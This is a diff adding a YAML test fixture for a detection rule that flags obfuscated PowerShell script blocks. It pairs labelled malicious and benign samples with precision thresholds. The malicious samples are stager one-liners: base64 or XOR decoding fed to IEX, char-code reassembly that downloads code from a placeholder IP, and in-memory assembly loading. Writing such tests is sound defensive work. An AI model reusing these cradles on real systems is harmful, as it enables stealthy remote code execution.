@@ -1,0 +1,168 @@
+description: >
+  The alerting tier of the obfuscated-PowerShell pair (EID 4104). The rule
+  requires an obfuscation primitive AND an execution or ingress sink in the same
+  script block.
+
+  The benign half of this set is deliberately the *sibling* rule's measured false
+  positives — -join building a path, [Convert]::ToInt parsing a config value,
+  FromBase64String decoding a certificate. Those are the events that make
+  posh_ps_susp_encoded_powershell_scriptblock unusable as an alert. If any of
+  them ever reaches this rule's severity, this gate fails, which is the whole
+  point of splitting the pair.
+
+  Two negatives test the AND from the other side: a sink with no obfuscation, and
+  the installer idiom (-join feeding Start-Process) that got Start-Process
+  removed from the sink list. One benign case does fire, and is kept: a bootstrap
+  script that base64-decodes its download URL genuinely looks like a stager.
+thresholds:
+  min_precision: 0.8
+  min_recall: 1.0
+  max_fp_rate: 0.15
+  justification: >-
+    One benign case fires and is expected to: a packaging script that decodes a
+    URL from base64 and then fetches it is, at the level of the script block, the
+    same behaviour as a stager. Separating them needs context this telemetry does
+    not carry (script path reputation, destination host), so the cost is one
+    declared false positive per baselined bootstrap script rather than a weaker
+    rule. Measured FP rate is 0.11 against the sibling rule's 0.67 on the same
+    benign events.
+
+cases:
+  - name: invoke_obfuscation_base64
+    label: malicious
+    why: base64 decode chained into IEX — obfuscation plus the interpreter sink
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('SQBFAFgAIAAo')))
+      Path: ""
+
+  - name: xor_decoder_stub
+    label: malicious
+    why: -bxor loop reconstructing a payload and executing it
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $k=0x41;$d=$e|%{$_ -bxor $k};IEX([char[]]$d -join '')
+      Path: ""
+
+  - name: char_array_reassembly
+    label: malicious
+    why: char-code reassembly hiding a cmdlet name, then a WebClient download
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $c=[char[]](73,69,88);$s=$c -join '';&$s ((New-Object Net.WebClient).DownloadString('http://198.51.100.20/a'))
+      Path: ""
+
+  - name: convert_toint_obfuscation
+    label: malicious
+    why: numeric reassembly via [Convert]::ToInt32 handed to IEX
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $b=@('49','45','58')|%{[char][Convert]::ToInt32($_,10)};IEX ($b -join '')
+      Path: ""
+
+  - name: reflective_assembly_load
+    label: malicious
+    why: >-
+      base64 .NET assembly loaded in memory — nothing touches disk, so this is
+      the case a file-scanning tier never sees
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $a=[Reflection.Assembly]::Load([Convert]::FromBase64String($enc));$a.EntryPoint.Invoke($null,@())
+      Path: ""
+
+  - name: admin_joins_path_segments
+    label: benign
+    why: >-
+      the sibling rule's single most likely false positive (-join building a
+      path). No sink, so this tier must stay silent.
+    event:
+      EventID: 4104
+      ScriptBlockText: $path = @($root, 'logs', $date) -join '\'
+      Path: C:\Scripts\rotate-logs.ps1
+
+  - name: report_script_formats_csv
+    label: benign
+    why: -join building a CSV row; fires on the sibling rule, must not fire here
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $line = ($user.Name, $user.Department, $user.Enabled) -join ','; Add-Content $out $line
+      Path: C:\Scripts\user-report.ps1
+
+  - name: parse_config_integer
+    label: benign
+    why: >-
+      [Convert]::ToInt32 parsing a config value; fires on the sibling rule, must
+      not fire here
+    event:
+      EventID: 4104
+      ScriptBlockText: $timeout = [Convert]::ToInt32($config.TimeoutSeconds)
+      Path: C:\Scripts\deploy.ps1
+
+  - name: legitimate_base64_certificate
+    label: benign
+    why: >-
+      FromBase64String decoding a certificate. The sibling rule cannot separate
+      this from a loader; this one can, because nothing executes the result.
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $raw = [System.Convert]::FromBase64String($pem); $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$raw)
+      Path: C:\Scripts\install-cert.ps1
+
+  - name: installer_joins_args_then_starts_process
+    label: benign
+    why: >-
+      -join assembling an argument list for Start-Process. This is why
+      Start-Process is not in the sink list: as an idiom it is indistinguishable
+      from ordinary packaging.
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $list = @('/S','/v','/qn') -join ' '; Start-Process -FilePath setup.exe -ArgumentList $list -Wait
+      Path: C:\Scripts\install-app.ps1
+
+  - name: module_download_without_obfuscation
+    label: benign
+    why: >-
+      the AND from the other side — a plain Invoke-WebRequest with no obfuscation
+      primitive anywhere in the block
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        Invoke-WebRequest -Uri https://internal.example.com/module.zip -OutFile $dst
+      Path: C:\Scripts\get-module.ps1
+
+  - name: bootstrap_decodes_url_then_fetches
+    label: benign
+    why: >-
+      DECLARED FALSE POSITIVE. A packaging script that keeps its download URL
+      base64-encoded and then fetches it. At script-block level this is a stager;
+      separating them needs script reputation or destination context the log does
+      not carry. Baseline the path, do not weaken the rule.
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $uri = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($packed)); Invoke-WebRequest -Uri $uri -OutFile $dst
+      Path: C:\ProgramData\chocolatey\bootstrap.ps1
+
+  - name: plain_service_check
+    label: benign
+    why: ordinary administrative PowerShell with neither half — a true negative
+    event:
+      EventID: 4104
+      ScriptBlockText: Get-Service -Name Spooler | Where-Object { $_.Status -ne 'Running' } | Start-Service
+      Path: C:\Scripts\healthcheck.ps1
+
+  - name: inventory_query
+    label: benign
+    why: a second clean administrative script, to keep the true-negative side honest
+    event:
+      EventID: 4104
+      ScriptBlockText: Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace
+      Path: C:\Scripts\inventory.ps1
